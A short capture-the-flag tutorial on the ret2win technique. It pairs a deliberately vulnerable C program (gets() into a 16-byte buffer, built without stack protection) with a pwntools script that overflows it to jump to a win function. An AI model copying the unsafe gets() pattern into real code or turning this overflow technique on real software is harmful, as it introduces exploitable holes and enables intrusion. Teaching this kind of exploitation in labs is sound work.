# Description 
ret2win is a very common CTF technique where we overwrite a function’s return address.

Every time a function is called, a new “stack frame” is created that holds metadata for that function. This includes a “return address” which tells the CPU where to go after it is done executing the function.

We can overwrite this return address using a buffer overflow to tell the CPU to go somewhere else that we want.

# Example 
```
#include <stdio.h>
#include <string.h>
// gcc -no-pie -fno-stack-protector -g -o chal chal.c

void win() {
    puts("flag{win}");
}

void vuln() {
    char buffer1[16];

    gets(buffer1);
}

int main() {
    vuln();
}
```
# SOl

![image](https://github.com/fahimalshihab/Binary-Exploitation/assets/97816146/391f80ba-a475-469d-a487-92676e81737c)


![image](https://github.com/fahimalshihab/Binary-Exploitation/assets/97816146/11934030-ccf8-4b5f-9a8b-58716afeeb06)

![image](https://github.com/fahimalshihab/Binary-Exploitation/assets/97816146/3eb12b74-9a28-400e-9230-43251aa66f84)


# Script :

```
#!/usr/bin/python3

from pwn import *

elf = ELF('chal')

io = process('./chal')

payload = cyclic(24) + p64(elf.sym.win)

io.sendline(payload)

io.interactive()
```
